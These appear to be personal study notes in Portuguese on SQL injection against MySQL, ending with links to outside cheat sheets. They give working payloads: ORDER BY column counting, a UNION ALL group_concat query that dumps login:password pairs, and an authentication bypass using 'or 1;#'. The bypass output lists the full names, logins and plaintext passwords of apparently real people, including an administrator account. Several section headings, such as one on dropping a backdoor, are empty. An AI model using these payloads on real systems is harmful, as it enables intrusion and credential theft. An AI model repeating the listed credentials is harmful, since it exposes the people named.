## Notas sobre SQL Injection


- Extraindo dados de usuários de um banco de dados cujo a tabela de users se chama "usuario" :

		select * from usuario where id = 1 order by 18;
			ERROR 1054 (42S22): Unknown column '18' in 'order clause'

---
		select * from usuario where id = 1 order by 19;
			Empty set (0.01 sec)

---

		select * from usuario where id = 6 union all select 1,(select group_concat(login,0x3a,senha) from usuario),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19;



- Bypass na autenticação :


		mysql> select nome_usuario,login,senha from usuario where login='ADM' and senha='farsoft01';
.................
+---------------+-------+-----------+
| nome_usuario  | login | senha     |
+---------------+-------+-----------+
| ADMINISTRADOR | ADM   | FARSOFT01 |
+---------------+-------+-----------+
1 row in set (0.00 sec)

		mysql> select nome_usuario,login,senha from usuario where login='ADM' and senha='blah';#'farsoft01';
		Empty set (0.00 sec)
.................

		mysql> select nome_usuario,login,senha from usuario where login='ADM' and senha='blah'or 1;#'farsoft01';

.................
+-------------------------------------------+---------------+-----------+
| nome_usuario                              | login         | senha     |
+-------------------------------------------+---------------+-----------+
| ADMINISTRADOR                             | ADM           | FARSOFT01 |
| MAYCON DOUGLAS DA SILVA                   | MAYCON        | 123       |
| MESSIAS JOSE DA SILVA                     | MESSIAS       | 123       |
| PETER MATEUS DA SILVA                     | PETER         | 240219    |
| POLIANA LEILA DA SILVA                    | POLIANA       | 123       |
| JUSSARA PRISCILA RIBEIRO DA SILVA MARINHO | PRISCILA      | 123       |
___________________________________________________________________________
.................


- Second order Injection :
- Droppping a Backdoor :
- Conditional Select :
- Bypassing Whitespace Filtering
- SQL Injection baseada no tempo:

---

Step by Step : READ - http://breakthesecurity.cysecurity.org/2010/12/hacking-website-using-sql-injection-step-by-step-guide.html

Tips 1 : READ - http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

Tips 2 : READ - http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet